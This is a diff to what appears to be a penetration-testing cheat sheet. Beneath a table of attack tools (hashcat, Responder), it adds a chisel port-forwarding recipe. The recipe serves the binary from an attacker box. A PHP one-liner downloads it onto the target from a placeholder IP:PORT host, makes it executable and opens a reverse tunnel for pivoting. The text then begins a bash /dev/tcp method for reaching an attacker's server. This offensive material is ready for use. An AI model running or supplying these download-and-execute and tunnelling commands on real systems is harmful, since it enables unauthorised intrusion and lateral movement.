@@ -29,6 +29,19 @@
 | [hashcat](https://hashcat.net/hashcat/) | GPU password cracker | `sudo apt install hashcat` |
 | [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS poisoner | `git clone` |
 
+# Port Forwarding using `chisel` tool
+```
+attacker box:
+# get chisel in same dir u r
+python3 -m http.server 3333
+./chisel server -p 8000 --reverse
+target box:
+cp /tmp
+php -r "file_put_contents('chisel', file_get_contents('http://IP:PORT/chisel'));"
+chmod +x chisel
+./chisel client IP:8000 R:PORTTOFORWARD:IPTOFORWARD:PORTTOFORWARD
+```
+
 1. Bash /dev/tcp Method (No Tools Required) 
 If bash (version 2.04+) is installed and compiled with –enable-net-redirections (standard on most Linux), you can use bash built-ins to open a TCP connection to an attacker's HTTP server. 
 Attacker Machine:
